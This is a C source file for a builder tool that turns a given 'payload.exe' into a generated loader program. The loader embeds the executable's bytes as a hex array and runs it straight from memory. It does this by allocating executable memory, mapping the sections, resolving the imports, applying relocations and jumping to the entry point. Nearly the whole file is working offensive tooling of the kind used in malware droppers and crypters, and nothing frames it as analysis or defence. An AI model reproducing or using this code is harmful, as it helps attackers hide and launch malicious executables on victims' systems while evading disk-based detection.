/**
 * exe_to_embedded_loader.c
 *
 * Compilation: gcc exe_to_embedded_loader.c -o exe_to_embedded_loader
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef _WIN32
#include <windows.h>
#else
typedef uint32_t DWORD;
typedef uint16_t WORD;
typedef uint8_t BYTE;
typedef uint64_t ULONG_PTR;
typedef uint64_t SIZE_T;

#pragma pack(push, 1)
typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    int32_t e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    BYTE MajorLinkerVersion;
    BYTE MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    ULONG_PTR ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD MajorOperatingSystemVersion;
    WORD MinorOperatingSystemVersion;
    WORD MajorImageVersion;
    WORD MinorImageVersion;
    WORD MajorSubsystemVersion;
    WORD MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD Subsystem;
    WORD DllCharacteristics;
    ULONG_PTR SizeOfStackReserve;
    ULONG_PTR SizeOfStackCommit;
    ULONG_PTR SizeOfHeapReserve;
    ULONG_PTR SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
#pragma pack(pop)
#endif

const char* default_template =
"#include <windows.h>\n"
"#include <stdio.h>\n"
"\n"
"// PE_BLOB_ARRAY\n"
"unsigned char pe_blob[] = { 0 };\n"
"\n"
"// ENTRY_POINT_RVA\n"
"DWORD entry_point_rva = 0;\n"
"\n"
"// IMAGE_BASE\n"
"ULONG_PTR image_base = 0;\n"
"\n"
"// SIZE_OF_IMAGE\n"
"SIZE_T size_of_image = 0;\n"
"\n"
"void load_pe() {\n"
"    PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)pe_blob;\n"
"    PIMAGE_NT_HEADERS nt_headers_raw = (PIMAGE_NT_HEADERS)((char*)pe_blob + dos_header_raw->e_lfanew);\n"
"    LPVOID pe_buffer = VirtualAlloc(NULL, nt_headers_raw->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
"    if (!pe_buffer) return;\n"
"    memcpy(pe_buffer, pe_blob, nt_headers_raw->OptionalHeader.SizeOfHeaders);\n"
"    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt_headers_raw);\n"
"    for (int i = 0; i < nt_headers_raw->FileHeader.NumberOfSections; i++) {\n"
"        if (sections[i].PointerToRawData != 0) {\n"
"            memcpy((char*)pe_buffer + sections[i].VirtualAddress, (char*)pe_blob + sections[i].PointerToRawData, sections[i].SizeOfRawData);\n"
"        }\n"
"    }\n"
"    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((char*)pe_buffer + ((PIMAGE_DOS_HEADER)pe_buffer)->e_lfanew);\n"
"    IMAGE_DATA_DIRECTORY import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n"
"    if (import_dir.Size > 0) {\n"
"        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pe_buffer + import_dir.VirtualAddress);\n"
"        while (import_desc->Name) {\n"
"            HMODULE h_module = LoadLibraryA((char*)pe_buffer + import_desc->Name);\n"
"            if (h_module) {\n"
"                PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->FirstThunk);\n"
"                PIMAGE_THUNK_DATA original_first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->OriginalFirstThunk);\n"
"                if (!import_desc->OriginalFirstThunk) original_first_thunk = first_thunk;\n"
"                while (original_first_thunk->u1.AddressOfData) {\n"
"                    if (IMAGE_SNAP_BY_ORDINAL(original_first_thunk->u1.Ordinal)) {\n"
"                        first_thunk->u1.Function = (ULONG_PTR)GetProcAddress(h_module, (LPCSTR)IMAGE_ORDINAL(original_first_thunk->u1.Ordinal));\n"
"                    } else {\n"
"                        PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((char*)pe_buffer + original_first_thunk->u1.AddressOfData);\n"
"                        first_thunk->u1.Function = (ULONG_PTR)GetProcAddress(h_module, import_by_name->Name);\n"
"                    }\n"
"                    first_thunk++; original_first_thunk++;\n"
"                }\n"
"            }\n"
"            import_desc++;\n"
"        }\n"
"    }\n"
"    ULONG_PTR delta = (ULONG_PTR)pe_buffer - image_base;\n"
"    if (delta != 0) {\n"
"        IMAGE_DATA_DIRECTORY reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
"        if (reloc_dir.Size > 0) {\n"
"            PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((char*)pe_buffer + reloc_dir.VirtualAddress);\n"
"            while (relocation->VirtualAddress != 0) {\n"
"                DWORD size = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n"
"                PWORD rel_data = (PWORD)((char*)relocation + sizeof(IMAGE_BASE_RELOCATION));\n"
"                for (DWORD i = 0; i < size; i++) {\n"
"                    WORD type = rel_data[i] >> 12;\n"
"                    WORD offset = rel_data[i] & 0xFFF;\n"
"                    if (type == IMAGE_REL_BASED_DIR64) {\n"
"                        *(PUINT64)((char*)pe_buffer + relocation->VirtualAddress + offset) += delta;\n"
"                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {\n"
"                        *(PDWORD)((char*)pe_buffer + relocation->VirtualAddress + offset) += (DWORD)delta;\n"
"                    }\n"
"                }\n"
"                relocation = (PIMAGE_BASE_RELOCATION)((char*)relocation + relocation->SizeOfBlock);\n"
"            }\n"
"        }\n"
"    }\n"
"    ((void(*)())((char*)pe_buffer + entry_point_rva))();\n"
"}\n"
"\n"
"int main() {\n"
"    load_pe();\n"
"    printf(\"Press Enter to exit...\");\n"
"    getchar();\n"
"    return 0;\n"
"}\n";

void print_hex_array(FILE* out, const uint8_t* data, size_t size) {
    fprintf(out, "unsigned char pe_blob[] = {");
    for (size_t i = 0; i < size; i++) {
        if (i % 12 == 0) fprintf(out, "\n    ");
        fprintf(out, "0x%02X%s", data[i], (i == size - 1) ? "" : ", ");
    }
    fprintf(out, "\n};\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [loader_template.c]\n", (argc > 0) ? argv[0] : "exe_to_embedded_loader");
        return 1;
    }

    const char* payload_path = argv[1];
    const char* template_path = (argc > 2) ? argv[2] : "loader_template.c";

    FILE* fp = fopen(payload_path, "rb");
    if (!fp) { perror("Error opening payload"); return 1; }
    fseek(fp, 0, SEEK_END);
    size_t file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    uint8_t* file_data = (uint8_t*)malloc(file_size);
    fread(file_data, 1, file_size, fp);
    fclose(fp);

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)file_data;
    if (dos_header->e_magic != 0x5A4D) { printf("Invalid PE file\n"); return 1; }
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(file_data + dos_header->e_lfanew);
    DWORD entry_point_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR image_base = nt_headers->OptionalHeader.ImageBase;
    DWORD size_of_image = nt_headers->OptionalHeader.SizeOfImage;

    char* template_data = NULL;
    FILE* t_fp = fopen(template_path, "r");
    if (t_fp) {
        fseek(t_fp, 0, SEEK_END);
        size_t t_size = ftell(t_fp);
        fseek(t_fp, 0, SEEK_SET);
        template_data = (char*)malloc(t_size + 1);
        fread(template_data, 1, t_size, t_fp);
        template_data[t_size] = '\0';
        fclose(t_fp);
    } else {
        template_data = strdup(default_template);
    }

    FILE* out_fp = fopen("final_loader.c", "w");
    if (!out_fp) { perror("Error opening final_loader.c"); return 1; }

    char* p = template_data;
    while (*p) {
        if (strncmp(p, "// PE_BLOB_ARRAY", 16) == 0) {
            print_hex_array(out_fp, file_data, file_size);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// ENTRY_POINT_RVA", 18) == 0) {
            fprintf(out_fp, "// ENTRY_POINT_RVA\nDWORD entry_point_rva = 0x%X;\n", entry_point_rva);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// IMAGE_BASE", 13) == 0) {
            fprintf(out_fp, "// IMAGE_BASE\nULONG_PTR image_base = 0x%llX;\n", (unsigned long long)image_base);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else if (strncmp(p, "// SIZE_OF_IMAGE", 16) == 0) {
            fprintf(out_fp, "// SIZE_OF_IMAGE\nSIZE_T size_of_image = 0x%X;\n", size_of_image);
            p = strchr(p, '\n'); if (p) p++;
            p = strchr(p, '\n'); if (p) p++;
        } else {
            fputc(*p++, out_fp);
        }
    }

    fclose(out_fp);
    free(file_data); free(template_data);
    printf("Generated final_loader.c successfully.\n");
    return 0;
}
